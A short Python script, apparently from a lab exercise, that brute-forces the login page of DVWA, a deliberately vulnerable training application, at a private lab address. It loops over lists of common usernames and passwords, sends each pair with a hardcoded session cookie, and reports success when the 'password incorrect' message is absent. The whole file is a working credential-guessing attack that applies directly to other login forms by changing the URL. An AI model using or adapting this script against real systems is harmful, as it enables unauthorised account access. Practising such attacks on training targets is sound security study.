import requests
import datetime

print(datetime.datetime.now())
user = ['test','admin','root','administrator','dvwa']
password = ['test','passwd', 'toor', 'password', '1234','1111']

for i in user:
    for j in password:
        URL="http://10.0.2.13:8080/vulnerabilities/brute/?username="+str(i)+"&password="+str(j)+"&Login=Login"

        cookie={
                "PHPSESSID":"4d4v36d8eindghvkdmct5oenb4",
                "security":"low"
                }

        session1=requests.Session()
        
        req=session1.get(URL,cookies=cookie)
        if(req.text.find("password incorrect")==-1):
            index=req.text.find("Welcome")    
            print("\n\n")
            print("Crack Success!!"+str(i)+"/"+str(j))
            print("\n\n")
            print(datetime.datetime.now())
            exit(0)
        else:
            print("Wrong username/password:"+str(i)+"/"+str(j))

